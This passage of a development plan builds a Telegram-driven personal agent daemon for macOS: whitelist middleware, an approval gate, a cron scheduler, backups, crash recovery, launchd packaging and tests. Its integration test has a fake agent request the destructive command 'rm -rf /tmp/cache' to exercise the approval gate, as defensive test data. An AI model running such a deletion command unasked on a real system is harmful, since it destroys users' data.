import { Bot, type Api, type Context, type NextFunction } from 'grammy';
import type { Config } from './config.js';
import type { Store } from './store.js';
import type { PermissionGate } from './gate.js';
import type { Worker } from './worker.js';
import type { TelegramApi } from './sender.js';
import { intakeMessage } from './intake.js';
import { statusText, queueText, newConversation, schedulesText } from './commands.js';

export function whitelistMiddleware(whitelist: number[]) {
  return async (ctx: Context, next: NextFunction): Promise<void> => {
    const id = ctx.from?.id;
    if (!id || !whitelist.includes(id)) {
      console.warn(`[gateway] dropped update from non-whitelisted sender ${id ?? 'unknown'}`);
      return;
    }
    await next();
  };
}

export async function handleApprovalCallback(gate: PermissionGate, ctx: Context & { match: RegExpMatchArray }): Promise<void> {
  const ok = gate.resolve(Number(ctx.match[1]), ctx.match[2] === 'y' ? 'approved' : 'denied');
  await ctx.answerCallbackQuery({ text: ok ? 'Recorded ✓' : 'Already decided or expired' });
  await ctx.editMessageReplyMarkup(undefined).catch(() => {});
}

export async function handleResumeCallback(store: Store, ctx: Context & { match: RegExpMatchArray }): Promise<void> {
  const t = store.getTask(Number(ctx.match[1]));
  if (t && t.status === 'interrupted') {
    store.enqueueTask({
      source: 'telegram', kind: 'resume', userId: t.userId, chatId: t.chatId,
      prompt: 'Continue where you left off on the interrupted task.',
    });
    await ctx.answerCallbackQuery({ text: 'Resuming ▶️' });
  } else {
    await ctx.answerCallbackQuery({ text: 'Not resumable' });
  }
}

export interface BotDeps { store: Store; gate: PermissionGate; worker: Worker; startedAt: Date; }

export function buildBot(cfg: Config, d: BotDeps): Bot {
  const bot = new Bot(cfg.telegramBotToken);
  bot.use(whitelistMiddleware(cfg.whitelist));

  bot.command('status', (ctx) => ctx.reply(statusText(d.store, d.worker, d.startedAt)));
  bot.command('queue', (ctx) => ctx.reply(queueText(d.store)));
  bot.command('schedules', (ctx) => ctx.reply(schedulesText(d.store)));
  bot.command('cancel', (ctx) =>
    ctx.reply(d.worker.cancel(ctx.from!.id) ? '🛑 Cancelling…' : 'No running task of yours to cancel.'));
  bot.command('new', (ctx) => {
    newConversation(d.store, ctx.from!.id, ctx.chat.id);
    return ctx.reply('🔄 Rotation queued — durable facts will be saved to memory first.');
  });

  bot.callbackQuery(/^apv:(\d+):(y|n)$/, (ctx) => handleApprovalCallback(d.gate, ctx));
  bot.callbackQuery(/^rsm:(\d+)$/, (ctx) => handleResumeCallback(d.store, ctx));

  // generic text intake LAST so command handlers win
  bot.on('message:text', (ctx) => {
    intakeMessage(d.store, {
      updateId: ctx.update.update_id, userId: ctx.from.id, chatId: ctx.chat.id, text: ctx.message.text,
    });
  });

  bot.catch((err) => console.error('[gateway] bot error', err.error));
  return bot;
}

/** Adapter: grammY Api → the Sender's TelegramApi interface. */
export class GrammyTelegramApi implements TelegramApi {
  constructor(private api: Api) {}
  async sendMessage(chatId: number, text: string, replyMarkupJson?: string | null): Promise<number> {
    const r = await this.api.sendMessage(chatId, text,
      replyMarkupJson ? { reply_markup: JSON.parse(replyMarkupJson) } : undefined);
    return r.message_id;
  }
  async editMessageText(chatId: number, messageId: number, text: string): Promise<void> {
    await this.api.editMessageText(chatId, messageId, text);
  }
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run tests/telegram.test.ts`
Expected: 5 passed.

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: grammY bot wiring with whitelist, commands, approval/resume callbacks"
```

---

### Task 13: Scheduler, runtime MCP tools, daily backup

**Files:**
- Create: `src/scheduler.ts`, `src/tools.ts`, `src/backup.ts`
- Test: `tests/scheduler.test.ts`, `tests/backup.test.ts`

- [ ] **Step 1: Write failing tests**

`tests/scheduler.test.ts`:
```ts
import { describe, it, expect, beforeEach } from 'vitest';
import { openDb } from '../src/db.js';
import { Store } from '../src/store.js';
import { Scheduler } from '../src/scheduler.js';

let store: Store; let sched: Scheduler;
beforeEach(() => { store = new Store(openDb(':memory:')); sched = new Scheduler(store); });

function addDaily8am(missedPolicy: 'run_now' | 'skip' = 'run_now'): number {
  return store.createSchedule({ cronExpr: '0 8 * * *', prompt: 'brief', missedPolicy, createdByUserId: 7, chatId: 70 });
}

describe('Scheduler.tick', () => {
  it('fires a due job once and enqueues a schedule-sourced task', () => {
    const id = addDaily8am();
    store.markScheduleRun(id, new Date('2026-06-09T08:00:00'));
    sched.tick(new Date('2026-06-10T08:00:30'));
    const tasks = store.pendingTasks();
    expect(tasks).toHaveLength(1);
    expect(tasks[0]).toMatchObject({ source: 'schedule', prompt: 'brief', chatId: 70 });
    sched.tick(new Date('2026-06-10T08:01:30')); // same day: not due again
    expect(store.pendingTasks()).toHaveLength(1);
  });

  it('does not fire before due time', () => {
    const id = addDaily8am();
    store.markScheduleRun(id, new Date('2026-06-10T08:00:00'));
    sched.tick(new Date('2026-06-10T12:00:00'));
    expect(store.pendingTasks()).toHaveLength(0);
  });

  it('never-run schedule fires only when cron matches the last minute', () => {
    addDaily8am();
    sched.tick(new Date('2026-06-10T12:00:00'));
    expect(store.pendingTasks()).toHaveLength(0);
    sched.tick(new Date('2026-06-10T08:00:20'));
    expect(store.pendingTasks()).toHaveLength(1);
  });
});

describe('Scheduler.startupCatchup', () => {
  it('fast-forwards skip-policy jobs missed during downtime', () => {
    const id = addDaily8am('skip');
    store.markScheduleRun(id, new Date('2026-06-08T08:00:00'));
    sched.startupCatchup(new Date('2026-06-10T12:00:00'));
    sched.tick(new Date('2026-06-10T12:00:30'));
    expect(store.pendingTasks()).toHaveLength(0); // skipped, not backfilled
  });

  it('leaves run_now jobs to fire on next tick', () => {
    const id = addDaily8am('run_now');
    store.markScheduleRun(id, new Date('2026-06-08T08:00:00'));
    sched.startupCatchup(new Date('2026-06-10T12:00:00'));
    sched.tick(new Date('2026-06-10T12:00:30'));
    expect(store.pendingTasks()).toHaveLength(1);
  });
});
```

`tests/backup.test.ts`:
```ts
import { describe, it, expect } from 'vitest';
import { mkdtempSync, writeFileSync, existsSync, readdirSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { openDb } from '../src/db.js';
import { Store } from '../src/store.js';
import { maybeBackup } from '../src/backup.js';

describe('maybeBackup', () => {
  it('copies db and agent home once per day and prunes old backups', () => {
    const root = mkdtempSync(join(tmpdir(), 'bk-'));
    const dbPath = join(root, 'agent.db');
    const home = join(root, 'home'); mkdirSync(home);
    writeFileSync(join(home, 'CLAUDE.md'), 'persona');
    const backups = join(root, 'backups'); mkdirSync(backups);
    const db = openDb(dbPath);
    const store = new Store(db);

    const day1 = new Date('2026-06-10T03:00:00');
    expect(maybeBackup(store, db, { dbPath, backupsDir: backups, agentHome: home }, day1)).toBe(true);
    expect(maybeBackup(store, db, { dbPath, backupsDir: backups, agentHome: home }, day1)).toBe(false); // same day
    expect(existsSync(join(backups, '2026-06-10', 'agent.db'))).toBe(true);
    expect(existsSync(join(backups, '2026-06-10', 'AgentHome', 'CLAUDE.md'))).toBe(true);

    // 8 more days → oldest pruned, 7 kept
    for (let i = 11; i <= 18; i++) {
      maybeBackup(store, db, { dbPath, backupsDir: backups, agentHome: home }, new Date(`2026-06-${i}T03:00:00`));
    }
    expect(readdirSync(backups).sort()).toHaveLength(7);
    expect(existsSync(join(backups, '2026-06-10'))).toBe(false);
  });
});
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run tests/scheduler.test.ts tests/backup.test.ts`
Expected: FAIL — cannot resolve `../src/scheduler.js` / `../src/backup.js`.

- [ ] **Step 3: Implement**

`src/scheduler.ts`:
```ts
import parser from 'cron-parser';
import type { Store } from './store.js';

export class Scheduler {
  constructor(private store: Store) {}

  /** Call every ~30s. Fires each due schedule once. */
  tick(now: Date = new Date()): void {
    for (const s of this.store.enabledSchedules()) {
      const after = s.lastRunAt ? new Date(s.lastRunAt) : new Date(now.getTime() - 60_000);
      const next = parser.parseExpression(s.cronExpr, { currentDate: after }).next().toDate();
      if (next <= now) {
        this.store.markScheduleRun(s.id, now);
        this.store.enqueueTask({
          source: 'schedule', kind: 'chat', userId: s.createdByUserId, chatId: s.chatId, prompt: s.prompt,
        });
      }
    }
  }

  /** On startup: skip-policy jobs missed during downtime are fast-forwarded; run_now jobs fire on next tick. */
  startupCatchup(now: Date = new Date()): void {
    for (const s of this.store.enabledSchedules()) {
      if (s.missedPolicy !== 'skip' || !s.lastRunAt) continue;
      const next = parser.parseExpression(s.cronExpr, { currentDate: new Date(s.lastRunAt) }).next().toDate();
      if (next <= now) this.store.markScheduleRun(s.id, now);
    }
  }
}
```

`src/tools.ts`:
```ts
import { tool, createSdkMcpServer } from '@anthropic-ai/claude-agent-sdk';
import parser from 'cron-parser';
import { z } from 'zod';
import type { Store } from './store.js';
import type { Task } from './types.js';

/** In-process MCP server exposing schedule management to the agent, scoped to the requesting task's user/chat. */
export function runtimeMcpServer(store: Store, task: Pick<Task, 'userId' | 'chatId'>): Record<string, unknown> {
  return {
    runtime: createSdkMcpServer({
      name: 'runtime',
      version: '1.0.0',
      tools: [
        tool(
          'schedule_create',
          'Create a recurring scheduled job. cron is a standard 5-field cron expression in local time. ' +
            'The prompt will run as a task and its result is sent to the creating user.',
          { cron: z.string(), prompt: z.string(), missed_policy: z.enum(['run_now', 'skip']).optional() },
          async (a) => {
            parser.parseExpression(a.cron); // throws on invalid cron
            const id = store.createSchedule({
              cronExpr: a.cron, prompt: a.prompt, missedPolicy: a.missed_policy ?? 'run_now',
              createdByUserId: task.userId, chatId: task.chatId,
            });
            return { content: [{ type: 'text', text: `Created schedule #${id} (${a.cron})` }] };
          },
        ),
        tool('schedule_list', 'List all scheduled jobs.', {}, async () => ({
          content: [{ type: 'text', text: JSON.stringify(store.listSchedules(), null, 2) }],
        })),
        tool('schedule_delete', 'Delete a scheduled job by its id.', { id: z.number() }, async (a) => {
          store.deleteSchedule(a.id);
          return { content: [{ type: 'text', text: `Deleted schedule #${a.id}` }] };
        }),
      ],
    }),
  };
}
```

`src/backup.ts`:
```ts
import { cpSync, mkdirSync, readdirSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import type { Database } from 'better-sqlite3';
import type { Store } from './store.js';

const KEEP = 7;

export function maybeBackup(
  store: Store,
  db: Database,
  p: { dbPath: string; backupsDir: string; agentHome: string },
  now: Date = new Date(),
): boolean {
  const today = now.toISOString().slice(0, 10);
  if (store.getMeta('last_backup_date') === today) return false;
  const dest = join(p.backupsDir, today);
  mkdirSync(dest, { recursive: true });
  db.pragma('wal_checkpoint(TRUNCATE)');
  cpSync(p.dbPath, join(dest, 'agent.db'));
  cpSync(p.agentHome, join(dest, 'AgentHome'), { recursive: true });
  const days = readdirSync(p.backupsDir).sort();
  for (const old of days.slice(0, Math.max(0, days.length - KEEP))) {
    rmSync(join(p.backupsDir, old), { recursive: true, force: true });
  }
  store.setMeta('last_backup_date', today);
  return true;
}
```

Note: `cron-parser@^4` default export is used (`parser.parseExpression`). If the installed major version is 5+, the import is `import { CronExpressionParser } from 'cron-parser'` and calls become `CronExpressionParser.parse(...)` — pin v4 in package.json (already done in Task 1).

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run tests/scheduler.test.ts tests/backup.test.ts`
Expected: 6 passed.

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: cron scheduler with missed-policy, schedule MCP tools, daily backup"
```

---

### Task 14: Agent Home scaffolding

**Files:**
- Create: `src/agent-home.ts`
- Test: `tests/agent-home.test.ts`

- [ ] **Step 1: Write failing tests**

`tests/agent-home.test.ts`:
```ts
import { describe, it, expect } from 'vitest';
import { mkdtempSync, existsSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { scaffoldAgentHome } from '../src/agent-home.js';

describe('scaffoldAgentHome', () => {
  it('scaffolds CLAUDE.md and memory/ into an empty folder', () => {
    const dir = mkdtempSync(join(tmpdir(), 'home-'));
    expect(scaffoldAgentHome(dir)).toBe(true);
    expect(existsSync(join(dir, 'CLAUDE.md'))).toBe(true);
    expect(existsSync(join(dir, 'memory', 'README.md'))).toBe(true);
    const md = readFileSync(join(dir, 'CLAUDE.md'), 'utf8');
    expect(md).toContain('memory/');
    expect(md).toContain('Telegram');
  });

  it('does not touch a folder that already has CLAUDE.md', () => {
    const dir = mkdtempSync(join(tmpdir(), 'home-'));
    writeFileSync(join(dir, 'CLAUDE.md'), 'custom persona');
    expect(scaffoldAgentHome(dir)).toBe(false);
    expect(readFileSync(join(dir, 'CLAUDE.md'), 'utf8')).toBe('custom persona');
  });
});
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run tests/agent-home.test.ts`
Expected: FAIL — cannot resolve `../src/agent-home.js`.

- [ ] **Step 3: Implement**

`src/agent-home.ts`:
```ts
import { existsSync, mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';

const CLAUDE_MD = `# Personal Agent

You are a personal assistant agent running permanently on the owner's Mac.
Users talk to you through Telegram; your replies are delivered as Telegram
messages, so keep them concise and avoid heavy markdown (no tables, no headers).

## Memory

Your long-term memory lives in the \`memory/\` directory of this folder.

- At the start of a conversation, read \`memory/index.md\` (if present) to load context.
- When you learn a durable fact (a preference, a person, a project, a decision),
  write it to a small markdown file under \`memory/\` and keep \`memory/index.md\`
  updated with one line per file.
- Several different users may talk to you. Attribute person-specific facts to the
  person they belong to (the runtime tells you who is asking in each task).

## Conduct

- You have full access to this machine; risky actions are gated by user approval.
- For scheduled-job prompts, do the work and reply with the result only.
- Use the runtime tools (schedule_create, schedule_list, schedule_delete) when a
  user asks for recurring jobs or reminders.
`;

const MEMORY_README = `Long-term memory of the agent. One small markdown file per topic; index.md lists them.
`;

/** Scaffold template files into an empty Agent Home. Returns false if CLAUDE.md already exists. */
export function scaffoldAgentHome(dir: string): boolean {
  if (existsSync(join(dir, 'CLAUDE.md'))) return false;
  mkdirSync(join(dir, 'memory'), { recursive: true });
  writeFileSync(join(dir, 'CLAUDE.md'), CLAUDE_MD);
  writeFileSync(join(dir, 'memory', 'README.md'), MEMORY_README);
  return true;
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run tests/agent-home.test.ts`
Expected: 2 passed.

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: agent home scaffolding with persona and memory templates"
```

---

### Task 15: Crash recovery + entrypoint

**Files:**
- Create: `src/recovery.ts`, `src/index.ts`
- Test: `tests/recovery.test.ts`

- [ ] **Step 1: Write failing test**

`tests/recovery.test.ts`:
```ts
import { describe, it, expect } from 'vitest';
import { openDb } from '../src/db.js';
import { Store } from '../src/store.js';
import { recoverInterrupted } from '../src/recovery.js';

describe('recoverInterrupted', () => {
  it('marks running tasks interrupted and queues a Resume offer per task', () => {
    const store = new Store(openDb(':memory:'));
    const id = store.enqueueTask({ source: 'telegram', kind: 'chat', userId: 7, chatId: 70, prompt: 'long job' });
    store.claimNextTask();
    const recovered = recoverInterrupted(store);
    expect(recovered.map((t) => t.id)).toEqual([id]);
    expect(store.getTask(id)?.status).toBe('interrupted');
    const offers = store.unsentMessages();
    expect(offers).toHaveLength(1);
    expect(offers[0].chatId).toBe(70);
    expect(offers[0].content).toContain('interrupted');
    expect(JSON.parse(offers[0].replyMarkup!).inline_keyboard[0][0].callback_data).toBe(`rsm:${id}`);
  });

  it('does nothing when no tasks were running', () => {
    const store = new Store(openDb(':memory:'));
    expect(recoverInterrupted(store)).toEqual([]);
    expect(store.unsentMessages()).toEqual([]);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/recovery.test.ts`
Expected: FAIL — cannot resolve `../src/recovery.js`.

- [ ] **Step 3: Implement recovery and the entrypoint**

`src/recovery.ts`:
```ts
import type { Store } from './store.js';
import type { Task } from './types.js';

export function recoverInterrupted(store: Store): Task[] {
  const tasks = store.markInterruptedOnStartup();
  for (const t of tasks) {
    store.enqueueMessage({
      chatId: t.chatId,
      content: `⚠️ Task #${t.id} was interrupted by a restart of the agent runtime.`,
      replyMarkup: JSON.stringify({ inline_keyboard: [[{ text: '▶️ Resume', callback_data: `rsm:${t.id}` }]] }),
    });
  }
  return tasks;
}
```

`src/index.ts` (wiring only — no unit test; verified by the smoke checklist in Task 16):
```ts
import { readFileSync } from 'node:fs';
import { appPaths, ensureAppData } from './paths.js';
import { loadConfig, ConfigError } from './config.js';
import { openDb } from './db.js';
import { Store } from './store.js';
import { Policy } from './policy.js';
import { PermissionGate } from './gate.js';
import { SdkClaudeRunner } from './claude.js';
import { Worker } from './worker.js';
import { Sender } from './sender.js';
import { Scheduler } from './scheduler.js';
import { runtimeMcpServer } from './tools.js';
import { scaffoldAgentHome } from './agent-home.js';
import { recoverInterrupted } from './recovery.js';
import { buildBot, GrammyTelegramApi } from './telegram.js';
import { maybeBackup } from './backup.js';

async function main(): Promise<void> {
  const paths = appPaths();
  ensureAppData(paths);

  let cfg;
  try {
    cfg = loadConfig(paths.configPath);
  } catch (e) {
    if (e instanceof ConfigError) {
      console.error(`[startup] ${e.message}`);
      await tryBroadcastStartupError(paths.configPath, e.message); // spec §8: report to users if Telegram reachable
      process.exit(1);
    }
    throw e;
  }

  if (cfg.claudeOauthToken) process.env.CLAUDE_CODE_OAUTH_TOKEN = cfg.claudeOauthToken;
  // Subscription auth: never pass an API key through to the SDK.
  delete process.env.ANTHROPIC_API_KEY;

  scaffoldAgentHome(cfg.agentHome);

  const db = openDb(paths.dbPath);
  const store = new Store(db);
  const gate = new PermissionGate(store, Policy.fromConfig(cfg), cfg.approvalTimeoutMs);
  const worker = new Worker({
    store, gate, runner: new SdkClaudeRunner(), agentHome: cfg.agentHome,
    mcpServersFor: (task) => runtimeMcpServer(store, task),
  });
  const startedAt = new Date();
  const bot = buildBot(cfg, { store, gate, worker, startedAt });
  const sender = new Sender(store, new GrammyTelegramApi(bot.api));
  const scheduler = new Scheduler(store);

  // startup self-check: verify Telegram auth before going live
  try {
    const me = await bot.api.getMe();
    console.log(`[startup] telegram ok (@${me.username})`);
  } catch (e) {
    console.error('[startup] telegram auth failed:', e);
    process.exit(1); // launchd restarts; ThrottleInterval rate-limits
  }

  // crash recovery: interrupted tasks → Resume offers (delivered by sender)
  const recovered = recoverInterrupted(store);
  if (recovered.length) console.log(`[startup] recovered ${recovered.length} interrupted task(s)`);
  scheduler.startupCatchup();

  // loops
  let draining = false;
  setInterval(async () => {
    if (draining) return;
    draining = true;
    try { await sender.drainOnce(); } finally { draining = false; }
  }, 2000);

  setInterval(() => {
    try {
      scheduler.tick();
      maybeBackup(store, db, { dbPath: paths.dbPath, backupsDir: paths.backupsDir, agentHome: cfg.agentHome });
    } catch (e) { console.error('[scheduler]', e); }
  }, 30_000);

  void (async () => {
    for (;;) {
      try {
        const worked = await worker.tick();
        if (!worked) await new Promise((r) => setTimeout(r, 1000));
      } catch (e) {
        console.error('[worker]', e);
        await new Promise((r) => setTimeout(r, 5000));
      }
    }
  })();

  console.log('[startup] agent-runtime up — long polling');
  await bot.start(); // long polling; resolves only on stop
}

/** Best-effort: if the broken config still has a usable token+whitelist, tell the users why startup failed. */
async function tryBroadcastStartupError(configPath: string, msg: string): Promise<void> {
  try {
    const raw = JSON.parse(readFileSync(configPath, 'utf8'));
    if (!raw.telegramBotToken || !Array.isArray(raw.whitelist)) return;
    const { Bot } = await import('grammy');
    const bot = new Bot(raw.telegramBotToken);
    for (const uid of raw.whitelist) {
      await bot.api.sendMessage(uid, `🚨 agent-runtime failed to start: ${msg}`).catch(() => {});
    }
  } catch { /* best effort only */ }
}

main().catch((e) => { console.error('[fatal]', e); process.exit(1); });
```

- [ ] **Step 4: Run all tests to verify everything passes**

Run: `npx vitest run && npx tsc --noEmit`
Expected: all tests pass; no type errors.

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: crash recovery and daemon entrypoint with self-check and loops"
```

---

### Task 16: launchd packaging, install script, README

**Files:**
- Create: `launchd/uz.domo.agent-runtime.plist`, `scripts/install.sh`, `README.md`

- [ ] **Step 1: Create the launchd plist template**

`launchd/uz.domo.agent-runtime.plist` (placeholders `__NODE__`, `__APP__`, `__LOGS__` substituted by install.sh):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key><string>uz.domo.agent-runtime</string>
  <key>ProgramArguments</key>
  <array>
    <string>__NODE__</string>
    <string>__APP__/dist/index.js</string>
  </array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
  <key>ThrottleInterval</key><integer>10</integer>
  <key>StandardOutPath</key><string>__LOGS__/agent-runtime.log</string>
  <key>StandardErrorPath</key><string>__LOGS__/agent-runtime.err.log</string>
  <key>EnvironmentVariables</key>
  <dict>
    <key>PATH</key><string>/usr/local/bin:/opt/homebrew/bin:/usr/bin:/bin</string>
  </dict>
</dict>
</plist>
```

- [ ] **Step 2: Create the install script**

`scripts/install.sh`:
```bash
#!/usr/bin/env bash
set -euo pipefail

APP="$(cd "$(dirname "$0")/.." && pwd)"
NODE="$(command -v node)"
LOGS="$HOME/Library/Application Support/agent-runtime/logs"
PLIST_SRC="$APP/launchd/uz.domo.agent-runtime.plist"
PLIST_DST="$HOME/Library/LaunchAgents/uz.domo.agent-runtime.plist"

echo "Building…"
cd "$APP" && npm run build

mkdir -p "$LOGS" "$HOME/Library/LaunchAgents"
sed -e "s|__NODE__|$NODE|g" -e "s|__APP__|$APP|g" -e "s|__LOGS__|$LOGS|g" "$PLIST_SRC" > "$PLIST_DST"

launchctl bootout "gui/$(id -u)" "$PLIST_DST" 2>/dev/null || true
launchctl bootstrap "gui/$(id -u)" "$PLIST_DST"
echo "Installed. Logs: $LOGS"
echo "First run creates the config template — fill it in, then: launchctl kickstart -k gui/$(id -u)/uz.domo.agent-runtime"
```

Run: `chmod +x scripts/install.sh`

- [ ] **Step 3: Write README.md**

`README.md`:
```markdown
# agent-runtime

Always-on personal agent on macOS, driven from Telegram, powered by your local
Claude Code with **subscription auth** (no API key).

## Prerequisites

1. **Node.js 22+** — `brew install node`
2. **Claude Code** installed and logged in with your subscription:
   `npm i -g @anthropic-ai/claude-code && claude login`
   (Headless alternative: `claude setup-token`, put the token into `claudeOauthToken` in config.)
3. **Telegram bot** — create via [@BotFather](https://t.me/BotFather), keep the token.
4. **Agent Home folder** — create the folder where the agent's CLAUDE.md, memory
   and working files will live (you provide it; the runtime scaffolds templates
   into it if empty): `mkdir -p ~/AgentHome`
5. **Keep the Mac awake** — `sudo pmset -a sleep 0; sudo pmset -a disablesleep 1`

## Install

```bash
npm install
./scripts/install.sh        # builds, installs the LaunchAgent, starts it
```

First start writes a config template to
`~/Library/Application Support/agent-runtime/config.json`. Fill in:

- `telegramBotToken` — from BotFather
- `whitelist` — array of allowed Telegram user IDs (everyone listed has FULL
  control of this machine; keep it short and trusted)
- `agentHome` — absolute path to your Agent Home folder

Then restart: `launchctl kickstart -k gui/$(id -u)/uz.domo.agent-runtime`

## Chat commands

`/status` uptime+queue · `/queue` pending tasks · `/cancel` abort your running
task · `/new` rotate conversation (saves memory first) · `/schedules` list jobs

## Manual smoke checklist (release gate)

- [ ] Send a message from a whitelisted account → status message appears, then the answer.
- [ ] Send from a non-whitelisted account → silently ignored (check logs).
- [ ] Ask for something risky ("delete /tmp/x") → Approve/Deny buttons; Deny → agent reports denial.
- [ ] `kill -9` the daemon mid-task → launchd restarts it; "interrupted" message with Resume button arrives; Resume continues in the same session.
- [ ] Ask "remind me in 2 minutes to stretch" → schedule fires, proactive message arrives.
- [ ] Hit the subscription usage limit (or simulate) → pause notification with reset time; queue resumes after reset.
- [ ] Reboot the Mac → daemon comes back, queued messages survive.
```

- [ ] **Step 4: Commit**

```bash
git add -A && git commit -m "feat: launchd packaging, install script, README with smoke checklist"
```

---

### Task 17: End-to-end integration test

**Files:**
- Test: `tests/integration.test.ts`

- [ ] **Step 1: Write the integration test**

`tests/integration.test.ts`:
```ts
import { describe, it, expect } from 'vitest';
import { openDb } from '../src/db.js';
import { Store } from '../src/store.js';
import { Policy } from '../src/policy.js';
import { PermissionGate } from '../src/gate.js';
import { Worker } from '../src/worker.js';
import { Sender, type TelegramApi } from '../src/sender.js';
import { intakeMessage } from '../src/intake.js';
import type { ClaudeRunner } from '../src/types.js';

class FakeApi implements TelegramApi {
  sent: { chatId: number; text: string; markup: string | null }[] = [];
  private nextId = 1;
  async sendMessage(chatId: number, text: string, markup?: string | null): Promise<number> {
    this.sent.push({ chatId, text, markup: markup ?? null });
    return this.nextId++;
  }
  async editMessageText(): Promise<void> {}
}

async function until(cond: () => boolean, ms = 1000): Promise<void> {
  const t0 = Date.now();
  while (!cond()) {
    if (Date.now() - t0 > ms) throw new Error('timeout waiting for condition');
    await new Promise((r) => setTimeout(r, 5));
  }
}

describe('pipeline: telegram in → worker → approval → telegram out', () => {
  it('runs a risky task end-to-end with user approval', async () => {
    const store = new Store(openDb(':memory:'));
    const api = new FakeApi();
    const sender = new Sender(store, api);
    const gate = new PermissionGate(store, new Policy('/home', []), 2000);
    // fake agent: asks permission for a risky command, then reports
    const runner: ClaudeRunner = {
      async *run(req) {
        yield { kind: 'session', sessionId: 's1' };
        const r = await req.canUseTool('Bash', { command: 'rm -rf /tmp/cache' });
        yield { kind: 'final', text: r.behavior === 'allow' ? 'cleaned the cache' : `refused: ${r.message}` };
      },
    };
    const worker = new Worker({ store, runner, gate, agentHome: '/home' });

    // 1. message arrives and is durably queued
    const r = intakeMessage(store, { updateId: 1, userId: 11, chatId: 11, text: 'clean the cache' });
    expect(r.queued).toBe(true);

    // 2. worker starts; gate blocks on approval
    const ticking = worker.tick();
    await until(() => store.unsentMessages().some((m) => m.kind === 'approval'));
    await sender.drainOnce();
    const approvalMsg = api.sent.find((m) => m.text.includes('Approval needed'))!;
    expect(approvalMsg.markup).toContain('apv:');

    // 3. user presses Approve
    const approvalId = Number(JSON.parse(approvalMsg.markup!).inline_keyboard[0][0].callback_data.split(':')[1]);
    expect(gate.resolve(approvalId, 'approved')).toBe(true);

    // 4. task completes; final answer delivered
    await ticking;
    await sender.drainOnce();
    expect(api.sent.some((m) => m.text === 'cleaned the cache')).toBe(true);
    expect(store.getTask(r.taskId!)?.status).toBe('done');
    expect(store.getApproval(approvalId)?.decision).toBe('approved');
  });
});
```

- [ ] **Step 2: Run the integration test**

Run: `npx vitest run tests/integration.test.ts`
Expected: 1 passed.

- [ ] **Step 3: Run the full suite + typecheck, then commit**

Run: `npx vitest run && npx tsc --noEmit`
Expected: all tests pass, no type errors.

```bash
git add -A && git commit -m "test: end-to-end pipeline integration test with approval round-trip"
```

---

## Spec coverage map

| Spec section | Tasks |
|---|---|
| §4.1 Stack | 1 |
| §4.2 Two-folder storage | 2 (App Data), 14 (Agent Home) |
| §4.3 Gateway (whitelist, persist-before-process, commands) | 11, 12 |
| §4.3 Durable Store | 3, 4, 5 |
| §4.3 Agent Worker (sequential, resume, progress edits) | 9, 10 |
| §4.3 Permission Gate | 7, 8 |
| §4.3 Scheduler + conversational tools | 13 |
| §5 Memory (facts / continuity / task state) | 14, 4, 10 |
| §6 Security (whitelist, secrets chmod 600, audit) | 2, 5, 12 |
| §7 Fault tolerance (recovery, outbox retry, usage limit, missed jobs, backup, error-reporting rule) | 6, 10, 13, 15 |
| §8 Operations (launchd, pmset, prerequisites, self-check) | 15, 16 |
| §9 Testing (unit, integration, smoke) | every task, 16 (checklist), 17 |
| §10 Build order | task order mirrors milestones 1–7 |





